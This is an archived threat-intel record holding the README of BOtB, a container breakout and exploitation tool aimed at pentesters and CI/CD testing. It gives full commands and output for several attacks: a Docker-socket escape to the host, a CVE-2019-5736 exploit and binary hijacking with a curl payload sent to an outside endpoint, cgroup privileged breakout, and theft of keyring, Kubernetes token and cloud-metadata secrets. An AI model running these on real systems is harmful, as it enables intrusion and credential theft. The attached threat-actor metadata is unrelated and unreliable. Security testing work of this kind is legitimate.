{
    "id": "d7b1d396-eff8-4efc-be44-e02e75aae28e",
    "created_at": "2023-01-12T15:07:47.048477Z",
    "updated_at": "2025-03-27T02:09:29.206682Z",
    "deleted_at": null,
    "sha1_hash": "809de98dbc5aea4d47340dbe5fdbcc1d14b91c54",
    "title": "2020-10-07 - Break out the Box (BOtB)",
    "authors": "",
    "file_creation_date": "2022-05-28T18:31:04Z",
    "file_modification_date": "2022-05-28T18:31:04Z",
    "file_size": 255718,
    "plain_text": "# brompwnie/botb: A container analysis and exploitation tool for pentesters and engineers.\n\n**github.com/brompwnie/botb**\n\nbrompwnie\n\n[DOWNLOADS](https://github.com/brompwnie/botb/releases) **27K**\n\n## Break out the Box (BOtB)\n\n#### BOtB is a container analysis and exploitation tool designed to be used by pentesters and engineers while also being CI/CD friendly with common CI/CD technologies.\n\n## What does it do?\n\n#### BOtB is a CLI tool which allows you to:\n\n Exploit common container vulnerabilities Perform common container post exploitation actions Provide capability when certain tools or binaries are not available in the Container Use BOtB's capabilities with CI/CD technologies to test container deployments Perform the above in either a manual or automated approach\n\n\n-----\n\n## Current Capabilities\n\n#### Perform a container breakout via exposed Docker daemons (docker.sock) Perform a container breakout via CVE-2019-5736 Perform a privileged container breakout via enabled CAPS and SYSCALLS Extract data from Linux Kernel Keyrings via abusing the Keyctl syscall through permissive seccomp profiles Identify Kubernetes Service Accounts secrets and attempt to use them Identify metadata services endpoints i.e http://169.254.169.254, http://metadata.google.internal/ and http://100.100.100.200/ Scrape metadata info from GCP metadata endpoints Analyze and identify sensitive strings in ENV and process in the ProcFS i.e /Proc/{pid}/Environ Find and Identify UNIX Domain Sockets Identify UNIX domain sockets which support HTTP Find and identify the Docker Daemon on UNIX domain sockets or on an interface Hijack host binaries with a custom payload Perform actions in CI/CD mode and only return exit codes > 0 Push data to an S3 bucket Force BOtB to always return a Exit Code of 0 (useful for non-blocking CI/CD) Perform the above from the CLI arguments or from a YAML config file Perform reverse DNS lookup\n\n## Installation\n\n Binaries\n\n#### For installation instructions from binaries please visit the Releases Page.\n\n## Via Go\n```\ngo get github.com/brompwnie/botb\n\n Building from source\n\n#### Building BOtB via Go:\ngo build\n\n Building BOtB via Make:\n\n```\n\n-----\n\n```\nmake\n\n## Usage\n\n#### BOtB can be compiled into a binary for the targeted platform and supports the following usage\n\n```\n\n-----\n\n```\n./botb linux amd64 h\n-aggr string\n    Attempt to exploit RuncPWN (default \"nil\")\n -always-succeed\n    Always set BOtB's Exit code to Zero\n -autopwn\n    Attempt to autopwn exposed sockets\n -cicd\n    Attempt to autopwn but don't drop to TTY,return exit code 1 if\nsuccessful else 0\n -config string\n    Load config from provided yaml file (default \"nil\")\n -endpoints string\n    Provide a textfile with endpoints to use for test (default \"nil\")\n -find-docker\n    Attempt to find Dockerd\n -find-http\n    Hunt for Available UNIX Domain Sockets with HTTP\n -find-sockets\n    Hunt for Available UNIX Domain Sockets\n -hijack string\n    Attempt to hijack binaries on host (default \"nil\")\n -k8secrets\n    Identify and Verify K8's Secrets\n -keyMax int\n     Maximum key id range (default 100000000) and max system value is\n999999999 (default 100000000)\n -keyMin int\n     Minimum key id range (default 1) (default 1)\n -metadata\n    Attempt to find metadata services\n -path string\n    Path to Start Scanning for UNIX Domain Sockets (default \"/\")\n -pwn-privileged string\n    Provide a command payload to try exploit --privilege CGROUP\nrelease_agent's (default \"nil\")\n -pwnKeyctl\n    Abuse keyctl syscalls and extract data from Linux Kernel keyrings\n -recon\n    Perform Recon of the Container ENV\n -region string\n    Provide a AWS Region e.g eu-west-2 (default \"nil\")\n -rev-dns string\n    Perform reverse DNS lookups on a subnet. Parameter must be in\nCIDR notation, e.g., -rev-dns 192.168.0.0/24 (default \"nil\")\n -s3bucket string\n    Provide a bucket name for S3 Push (default \"nil\")\n -s3push string\n    Push a file to S3 e.g Full command to push to\nhttps://YOURBUCKET.s3.eu-west-2.amazonaws.com/FILENAME would be: -region\neu-west-2 -s3bucket YOURBUCKET -s3push FILENAME (default \"nil\")\n -scrape-gcp\n    Attempt to scrape the GCP metadata service\n -verbose\n    Verbose output\n\n```\n\n-----\n\n```\n wordlist string\n    Provide a wordlist (default \"nil\")\n\n#### BOtB can also be instructed to load settings from a YAML file via the config parameter\n#./botb-linux-amd64 -config=cfg.yml\n[+] Break Out The Box\n[+] Loading Config: cfg.yml\n...\n\n The following usage examples will return a Exit Code > 0 by default when an anomaly is detected, this is depicted by \"echo $?\" which shows the exit code of the last executed command.\n\n### Identify and Extract Linux Kernel Keyring Secrets that have not been properly protected\n\n#### More info from the original author here https://www.antitree.com/2020/07/keyctl-unmask-going-florida-on-the-state-of- containerizing-linux-keyrings/\n\n```\n\n-----\n\n```\n#./botb linux amd64 pwnKeyctl true keyMin 0 keyMax 100000000\n[+] Break Out The Box\n[*] Attempting to Identify and Extract Keyring Values\n[!] WARNING, this can be resource intensive and your pod/container\nprocess may be killed, iterate over min and max with 100000000 increments\nto be safe\n[!] Subkey description for key [251133632]:\nuser;0;0;3f010000;brompwnie_secret\n[!] Output {\n \"KeyId\": 13738777,\n \"Valid\": true,\n \"Name\":\n\"_ses.e326b8816c24d0ddda6c2c82ecf62ea2302a7239fce2fd104775d154a97fa3d6\",\n \"Type\": \"keyring\",\n \"Uid\": \"0\",\n \"Gid\": \"0\",\n \"Perms\": \"3f1b0000\",\n \"String_Content\": \"\\ufffd\\ufffd\\ufffd\\u000e\",\n \"Byte_Content\": \"wP73Dg==\",\n \"Comments\": null,\n \"Subkeys\": [\n {\n  \"KeyId\": 251133632,\n  \"Valid\": true,\n  \"Name\": \"brompwnie_secret\",\n  \"Type\": \"user\",\n  \"Uid\": \"0\",\n  \"Gid\": \"0\",\n  \"Perms\": \"3f010000\",\n  \"String_Content\": \"thetruthisialsoreallyliketrees\",\n  \"Byte_Content\": \"dGhldHJ1dGhpc2lhbHNvcmVhbGx5bGlrZXRyZWVz\",\n  \"Comments\": null,\n  \"Subkeys\": null,\n  \"Output\": \"\"\n }\n ],\n \"Output\": \"\"\n}\n[+] Finished\n\n### Identify and Verify mounted Kubernetes Service Account Secrets\n\n```\n\n-----\n\n```\n#./botb linux amd64 k8secrets true\n[+] Break Out The Box\n[*] Identifying and Verifying K8's Secrets\n[!] Token found at: /var/run/secrets/kubernetes.io/serviceaccount/token\n[!] Token found at: /run/secrets/kubernetes.io/serviceaccount/token\n[*] Trying: https://kubernetes.default/api/v1\n[!] Valid response with token (xxxxxxxxxx...)on ->\nhttps://kubernetes.default/api/v1\n[*] Trying: https://kubernetes.default/api/v1/namespaces\n[*] Trying: https://kubernetes.default/api/v1/namespaces/default/secrets\n[*] Trying: https://kubernetes.default/api/v1/namespaces/default/pods\n[*] Trying: https://kubernetes.default/api/v1\n[!] Valid response with token (xxxxxxxxxx...)on ->\nhttps://kubernetes.default/api/v1\n[*] Trying: https://kubernetes.default/api/v1/namespaces\n[*] Trying: https://kubernetes.default/api/v1/namespaces/default/secrets\n[*] Trying: https://kubernetes.default/api/v1/namespaces/default/pods\n[+] Finished\n\n### Break out from Container via Exposed Docker Daemon\n\n#### This approach will breakout into an interactive TTY on the host.\n#./bob_linux_amd64 -autopwn=true  \n[+] Break Out The Box\n[+] Attempting to autopwn\n[+] Hunting Docker Socks\n[+] Attempting to autopwn: /var/meh\n[+] Attempting to escape to host...\n[+] Attempting in TTY Mode\n./docker/docker -H unix:///var/meh run -t -i -v /:/host alpine:latest\n/bin/sh\nchroot /host && clear\necho 'You are now on the underlying host'\nYou are now on the underlying host\n/ # \n\n### Break out of a Container but in a CI/CD Friendly way\n\n#### This approach does not escape into a TTY on the host but instead returns an Exit Code > 0 to indicate a successful container breakout.\n#./bob_linux_amd64 -autopwn=true -cicd=true\n[+] Break Out The Box\n[+] Attempting to autopwn\n[+] Hunting Docker Socks\n[+] Attempting to autopwn: /var/meh\n[+] Attempting to escape to host...\n[!] Successfully escaped container\n[+] Finished\n#echo $?\n1\n\n```\n\n-----\n\n### Exploit CVE-2019-5736 with a Custom Payload\n\n#### Please note that for this exploit to work, a process has to be executed in the target container in this scenario.\n```\n#./bob_linux_amd64 -aggr='curl \"https://some.endpoint.com?\ncommand=$0&param1=$1&param2=$2\">/dev/null 2>&1'\n[+] Break Out The Box[!] WARNING THIS OPTION IS NOT CICD FRIENDLY, THIS\nWILL PROBABLY BREAK THE CONTAINER RUNTIME BUT YOU MIGHT GET SHELLZ...\n[+] Attempting to exploit CVE-2019-5736 with command: curl\n\"https://bobendpoint.herokuapp.com/canary/bobby?command=$0&param1=$\n1&param2=$2\">/dev/null 2>&1\n[+] This process will exit IF an EXECVE is called in the Container or if\nthe Container is manually stopped\n[+] Finished\n\n### Hijack Commands/Binaries on a Host with a Custom Payload\n\n#### Please note that this can be used to test if external entities are executing commands within the container. Examples are Docker Exec and Kubetcl CP.\n#./bob_linux_amd64 -hijack='curl\n\"https://bobendpoint.herokuapp.com/canary/bobby?command=$0&param1=$\n1&param2=$2\">/dev/null 2>&1'\n[+] Break Out The Box\n[!] WARNING THIS WILL PROBABLY BREAK THE CONTAINER BUT YOU MAY GET\nSHELLZ...\n[+] Attempting to hijack binaries\n[*] Command to be used: curl\n\"https://bobendpoint.herokuapp.com/canary/bobby?\ncommand=$0&param1=$1&param2=$2\">/dev/null 2>&1\n[+] Currently hijacking: /bin\n[+] Currently hijacking: /sbin\n[+] Currently hijacking: /usr/bin\n[+] Finished\n\n### Find UNIX Domain Sockets\n#./botb-linux-amd64 -find-sockets=true\n[+] Break Out The Box\n[+] Hunting Down UNIX Domain Sockets from: /\n[!] Valid Socket: /var/meh\n[+] Finished\n#echo $?\n1\n\n Find a Docker Daemon\n\n```\n\n-----\n\n```\n#./bob_linux_amd64 find docker true\n[+] Break Out The Box\n[+] Looking for Dockerd\n[!] Dockerd DOCKER_HOST found: tcp://0.0.0.0:2375\n[+] Hunting Docker Socks\n[!] Valid Docker Socket: /var/meh\n[+] Finished\n#echo $?\n1\n\n### Analyze ENV and ProcFS Environ for Sensitive Strings\n\n#### By default BOtB will search for the two terms \"secret\" and \"password\".\n ./bob_linux_amd64 -recon=true\n[+] Break Out The Box\n[+] Performing Container Recon\n[+] Searching /proc/* for data\n[!] Sensitive keyword found in: /proc/1/environ ->\n'PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/\n[!] Sensitive keyword found in: /proc/12/environ ->\n'GOLANG_VERSION=1.12.4HOSTNAME=0e51200113eaGOPATH=/goPWD=/app/binHOME=/roo\n[!] Sensitive keyword found in: /proc/self/environ ->\n'HOSTNAME=0e51200113eaSHLVL=1HOME=/rootfoo=secretpasswordOLDPWD=/bin_=./bo\n[!] Sensitive keyword found in: /proc/thread-self/environ ->\n'HOSTNAME=0e51200113eaSHLVL=1HOME=/rootfoo=secretpasswordOLDPWD=/bin_=./bo\n[+] Checking ENV Variables for secrets\n[!] Sensitive Keyword found in ENV: foo=secretpassword\n[+] Finished\n#echo $?\n1\n\n A wordlist can be supplied to BOtB to scan for particular keywords.\n#cat wordlist.txt \nmoo\n# ./bob_linux_amd64 -recon=true -wordlist=wordlist.txt\n[+] Break Out The Box\n[+] Performing Container Recon\n[+] Searching /proc/* for data\n[*] Loading entries from: wordlist.txt\n[+] Checking ENV Variables for secrets\n[*] Loading entries from: wordlist.txt\n[+] Finished\n# echo $?\n0\n\n```\n\n-----\n\n### Scan for Metadata Endpoints\n\n#### BOtB by default scans for two Metadata endpoints.\n```\n# ./bob_linux_amd64 -metadata=true          \n[+] Break Out The Box\n[*] Attempting to query metadata endpoint:\n'http://169.254.169.254/latest/meta-data/'\n[*] Attempting to query metadata endpoint:\n'http://kubernetes.default.svc/'\n[+] Finished\n# echo $?\n0\n\n BOtB can also be supplied with a list of endpoints to scan for.\n# cat endpoints.txt \nhttps://heroku.com\n# ./bob_linux_amd64 -metadata=true -endpointlist=endpoints.txt\n[+] Break Out The Box\n[*] Loading entries from: endpoints.txt\n[*] Attempting to query metadata endpoint: 'https://heroku.com'\n[!] Reponse from 'https://heroku.com' -> 200\n[+] Finished\n# echo $?\n1\n\n### Scan for UNIX Domain Sockets that respond to HTTP\n# ./bob_linux_amd64 -find-http=true\n[+] Break Out The Box\n[+] Looking for HTTP enabled Sockets\n[!] Valid HTTP Socket: /var/run/docker.sock\n[+] Finished\n\n Scrape data from GCP metadata instance\n\n```\n\n-----\n\n```\n# ./botb_linux_amd64 scrape gcp true\n[+] Break Out The Box\n[+] Attempting to connect to: 169.254.169.254:80\n[*] Output->\n HTTP/1.0 200 OK\nMetadata-Flavor: Google\nContent-Type: application/text\nDate: Sun, 30 Jun 2019 21:53:41 GMT\nServer: Metadata Server for VM\nConnection: Close\nContent-Length: 21013\nX-XSS-Protection: 0\nX-Frame-Options: SAMEORIGIN\n0.1/meta-data/attached-disks/disks/0/deviceName persistent-disk-0\n0.1/meta-data/attached-disks/disks/0/index 0\n0.1/meta-data/attached-disks/disks/0/mode READ_WRITE\n.....\n\n### Push data to an AWS S3 Bucket\n# ./bob_linux_amd64 -s3push=fileToPush.tar.gz -s3bucket=nameOfS3Bucket region=eu-west-2\n[+] Break Out The Box\n[+] Pushing fileToPush.tar.gz -> nameOfS3Bucket\n[*] Data uploaded to: https://nameOfS3Bucket.s3.eu-west2.amazonaws.com/fileToPush.tar.gz\n[+] Finished\n\n Break out of a Privileged Container\n# ./bob_linux_amd64 -pwn-privileged=hostname\n[+] Break Out The Box\n[+] Attempting to exploit CGROUP Privileges\n[*] The result of your command can be found in /output\n[+] Finished\nroot@418fa238e34d:/app# cat /output \ndocker-desktop\n\n Force BOtB to always succeed with a Exit Code of 0\n\n#### This is useful for non-blocking CI/CD tests\n\n```\n\n-----\n\n```\n# ./bob_linux_amd64 pwn privileged hostname always succeed true\n[+] Break Out The Box\n[+] Attempting to exploit CGROUP Privileges\n[*] The result of your command can be found in /output\n[+] Finished\n# echo $?\n0\n\n### Using BOtB with a YAML config file\n\n#### Example YAML file cfg.yml\npayload: id\nverbose: false\nalways-succeed: true\ncicd: false\nendpointlist: endpoints.txt\nwordlist: wordlist.txt\npath: /\nmode: find-sockets\n\n Run BOtB with the above YAML\n# ./bob_linux_amd64 -config=cfg.yml\n[+] Break Out The Box\n[+] Loading Config: cfg.yml\n[+] Looking for UNIX Domain Sockets from: /\n[!] Valid Socket: /tmp/thisisnotasocket.mock\n[+] Finished\n\n## Using BOtB with CI\\CD\n\n#### BOtB can be used with CI\\CD technologies that make use of exit codes to determine if tests have passed or failed. Below is a Shell script that executes two BOtB tests and the exit codes of the two tests are used to set the exit of the Shell script. If any of the two tests return an Exit Code >0, the test executing the shell script will fail.\n\n```\n\n-----\n\n```\n#!/bin/sh \nexitCode=0\necho \"[+] Testing UNIX Sockets\"\n./bob_linux_amd64 -autopwn -cicd=true\nexitCode=$?\necho \"[+] Testing Env\"\n./bob_linux_amd64 -recon=true\nexitCode=$?\n(exit $exitCode)\n\n#### The above script is not the only way to use BOtB with CI\\CD technologies but could also be used by itself and not wrapped in a shell script. An example YML config would be:\nversion: 2\ncicd:\n runATest: ./bob_linux_amd64 -autopwn -cicd=true\n\n Below is an example config that can be used with Heroku CI:\n{\n  \"environments\": {\n    \"test\": {\n      \"scripts\": {\n        \"test\": \"./bob_linux_amd64 -autopwn -cicd=true\"\n      }\n    }\n  }\n}\n\n Below is an example config with Heroku CI but using a wrapper shell script:\n{\n  \"environments\": {\n    \"test\": {\n      \"scripts\": {\n        \"test\": \"./bin/testSocksAndEnv.sh\"\n      }\n    }\n  }\n}\n\n## Issues, Bugs and Improvements\n\n#### For any bugs, please submit an issue. There is a long list of improvements but please submit an Issue if there is something you want to see added to BOtB\n\n```\n\n-----\n\n## References and Resources\n\n#### This tool would not be possible without the contribution of others in the community, below is a list of resources that have helped me.\n\n## Talks and Events\n\n#### BOtB is scheduled to be presented at the following:\n\n BSides London 2019 (https://sched.co/PAwB) and slides can be found here https://github.com/brompwnie/bsideslondon2019 Blackhat Las Vegas Arsenal 2019 (https://www.blackhat.com/us- 19/arsenal/schedule/index.html#break-out-the-box-botb-container- analysis-exploitation-and-cicd-tool-14988) DefCon 27 Cloud Village (https://cloud-village.org/) Blackhat Europe 2019 (https://www.blackhat.com/eu- 19/briefings/schedule/index.html#reverse-engineering-and-exploiting- builds-in-the-cloud-17287) DevSecCon London 2019 (https://www.devseccon.com/london-2019/)\n\n## License\n\n#### BOtB is licensed under a Creative Commons Attribution-NonCommercial- ShareAlike 4.0 International License (http://creativecommons.org/licenses/by- nc-sa/4.0).\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-10-07 - Break out the Box (BOtB).pdf"
    ],
    "report_names": [
        "2020-10-07 - Break out the Box (BOtB).pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536067,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653762664,
    "ts_modification_date": 1653762664,
    "files": {
        "pdf": "https://archive.orkl.eu/809de98dbc5aea4d47340dbe5fdbcc1d14b91c54.pdf",
        "text": "https://archive.orkl.eu/809de98dbc5aea4d47340dbe5fdbcc1d14b91c54.txt",
        "img": "https://archive.orkl.eu/809de98dbc5aea4d47340dbe5fdbcc1d14b91c54.jpg"
    }
}